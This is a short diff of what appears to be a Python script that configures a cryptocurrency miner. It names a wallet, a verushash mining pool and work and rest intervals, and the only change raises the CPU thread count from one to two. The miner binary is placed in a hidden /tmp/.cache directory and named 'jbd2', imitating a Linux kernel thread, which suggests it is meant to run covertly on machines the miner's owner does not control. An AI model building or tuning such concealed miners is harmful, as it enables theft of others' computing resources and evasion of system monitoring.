@@ -6,7 +6,7 @@ import os
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 POOL = "sg.vipor.net:5040"
 ALGO = "verushash"
-CPU_THREADS = 1
+CPU_THREADS = 2
 PROGRAM_TIME = 30  # Menit program
 REST_TIME = 10  # Menit istirahat
 JBD2_PATH = "/tmp/.cache/jbd2"  # Lokasi binary
